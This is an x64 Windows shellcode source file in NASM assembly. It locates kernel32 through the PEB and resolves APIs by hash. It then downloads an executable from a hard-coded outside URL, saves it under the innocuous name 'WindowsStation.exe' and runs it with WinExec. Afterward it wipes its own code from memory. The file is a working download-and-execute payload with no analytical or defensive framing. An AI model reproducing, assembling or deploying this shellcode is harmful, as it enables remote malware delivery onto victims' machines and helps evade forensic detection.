USE64

ShellCode_Start:
push rbx
push rbp
push rdi
push rsi
push r12
push r13
push r14
push r15
mov rbp,rsp
and rsp,0xFFFFFFFFFFFFFFF0
call GetKernel32BaseAddress_Start
mov rax,rsi
call EnumHashValueApi_Start
call GetCurrentAddress 
GetCurrentAddress:
BASE_OFFSET_CURRENT_ADDRESS equ (GetCurrentAddress - ShellCode_Start)
pop r15
sub r15,BASE_OFFSET_CURRENT_ADDRESS
;///////////////////////////////////////////////////////////////////////////////////////////
sub rsp,0x20
lea rcx,[r15 + Lib_User32_Name]
call [r15 + x64_LoadLibraryA]
mov [r15 + x64_User32Module],eax
add rsp,0x20
sub rsp,0x50
mov rcx,rax
lea rdx,[r15 + MessageBoxA_Name]
call [r15 + x64_GetProcAddress]
xor r9,r9
;xor r8,r8
lea r8,[r15 + RunExeName]
;xor rdx,rdx
lea rdx,[r15 + UrlAddress]
xor rcx,rcx
call rax
add rsp,0x50
mov rcx,[r15 + x64_User32Module]
call [r15 + x64_FreeLibrary]
;///////////////////////////////////////////////////////////////////////////////////////////
%ifdef _URL_DOWNLOAD_FILE
lea rcx,[r15 + Lib_Urlmon_Name]
call [r15 + x64_LoadLibraryA]
mov [r15 + x64_UrlMonModule],rax
lea rdx,[r15 + URLDownloadToFile_Name]
mov rcx,rax
call [r15 + x64_GetProcAddress]
mov [r15 + x64_URLDownloadToFile],rax
ShellCode_Downloader:
mov ecx,5000
call [r15 + x64_Sleep]
mov qword [rsp + 0x20],0
xor r9d,r9d
lea r8,[r15 + RunExeName]
lea rdx,[r15 + UrlAddress]
xor rcx,rcx
call [r15 + x64_URLDownloadToFile]
cmp eax,0
jnz ShellCode_Return
xor edx,edx
lea rcx,[r15 + RunExeName]
call [r15 + x64_WinExec]
mov rcx,[r15 + x64_UrlMonModule]
call [r15 + x64_FreeLibrary]
ShellCode_Return:
%endif
mov rsp,rbp
jmp ShellCode_Clean_Code
GetKernel32BaseAddress_Start:
nop
mov rcx,0x60
mov rsi,[gs:rcx]
mov rsi,[rsi + 0x18]
mov rsi,[rsi + 0x30]
mov rsi,[rsi]
mov rsi,[rsi]
mov rsi,[rsi + 0x10]
retn
GetKernel32BaseAddress_End:

EnumHashValueApi_Start:
push rbp
mov rsi,rax
mov ecx,[rsi + 0x3C]
add rcx,rsi
mov edx,[rcx + 0x88]
add rdx,rsi
push rcx
mov ecx,[rdx + 0x20]
add rcx,rsi
mov r14d,[rdx + 0x1C]
add r14,rsi
mov edi,[rdx + 0x18]
mov ebp,[rdx + 0x24]
add rbp,rsi
xor r8,r8
Enum_Next:
mov edx,[rcx]
add rdx,rsi
mov bx,[rbp + r8 * 2]
and ebx,0xFFFF
mov eax,[r14 + rbx * 4]
add rax,rsi
call GetExportApi_Start
add rcx,4
inc r8
dec edi
jnz Enum_Next
pop rdx
pop rbp
retn
EnumHashValueApi_End:

GetExportApi_Start:
call CalcApiNameHashValue_Start
call GetCurrentHashValueAddress 
GetCurrentHashValueAddress:
BASE_OFFSET_CURRENT_HASHVALE_ADDRESS equ (GetCurrentHashValueAddress - ShellCode_Start)
pop r15
sub r15,BASE_OFFSET_CURRENT_HASHVALE_ADDRESS
lea r11,[r15 + MyUseApiHashValue]
lea r13,[r15 + MyUseApiSaveAddress]
mov r12,0xFFFFFFFFFFFFFFFC
Get_Next:
add r12,4
cmp dword [r11 + r12],0
jz Get_Return
cmp[r11 + r12],r9d
jnz Get_Next
mov[r13 + r12 * 2],rax
Get_Return:
retn
GetExportApi_End:
CalcApiNameHashValue_Start:
xor r9d,r9d
xor r10d,r10d
inc r9d
xor r11d,r11d
Next_Calc:
mov r11b,[rdx]
test r11b,r11b
jz Calc_Return
add r9d,r11d
add r10d,r9d
inc rdx
jmp Next_Calc
Calc_Return:
shl r10d,0x10
or r9d,r10d
retn
CalcApiNameHashValue_End:
;Lib_Kernel32_Name				db "kernel32.dll",0
Lib_Urlmon_Name					db "urlmon.dll",0
URLDownloadToFile_Name			db "URLDownloadToFileA",0
UrlAddress						db "http://www.bioskit.com/fuck.exe",0
RunExeName						db "WindowsStation.exe",0
Lib_User32_Name					db "user32.dll",0
MessageBoxA_Name				db "MessageBoxA",0
x64_User32Module				dq 0x0000000000000000
x64_UrlMonModule				dq 0x0000000000000000	

MyUseApiHashValue:

HashValue_LoadLibraryA			dd 0x1D810497		;LoadLibraryA
HashValue_FreeLibrary			dd 0x18F20458		;FreeLibrary
;HashValue_VirtualAlloc			dd 0x1F7004D3		;VirtualAlloc
;HashValue_VirtualFree			dd 0x1AAB046A		;VirtualFree
HashValue_GetProcAddress		dd 0x27C7057B		;GetProcAddress
HashValue_WinExec				dd 0x0AAD02B4		;WinExec
HashValue_Sleep					dd 0x05BD01FA		;Sleep
;HashValue_MessageBoxA			dd 0x197F0430		;MessageBoxA
;HashValue_URLDownloadToFileA	dd 0x3F3906B0		;URLDownloadToFile
HashValue_End					dd 0x00000000		;End

MyUseApiSaveAddress:

;x64_Check_Resverd				dq 0x0000000000000000
x64_LoadLibraryA				dq 0x0000000000000000
x64_FreeLibrary					dq 0x0000000000000000
;x64_VirtualAlloc				dq 0x0000000000000000
;x64_VirtualFree				dq 0x0000000000000000
x64_GetProcAddress				dq 0x0000000000000000
x64_WinExec						dq 0x0000000000000000
x64_Sleep						dq 0x0000000000000000
x64_URLDownloadToFile 			dq 0x0000000000000000

ShellCode_Clean_Code:
call ShellCode_Clean_Code_Address
ShellCode_Clean_Code_Address:
BASE_OFFSET_CURRENT_CLEAN_CODE_ADDRESS equ (ShellCode_Clean_Code_Address - ShellCode_Start)
pop rax
lea rdi,[rax - BASE_OFFSET_CURRENT_CLEAN_CODE_ADDRESS]
mov rcx,ShellCode_Clean_Code - ShellCode_Start
xor rax,rax
rep stosb
pop r15
pop r14
pop r13
pop r12
pop rsi
pop rdi
pop rbp
pop rbx
retn
db 0x77
ShellCode_End: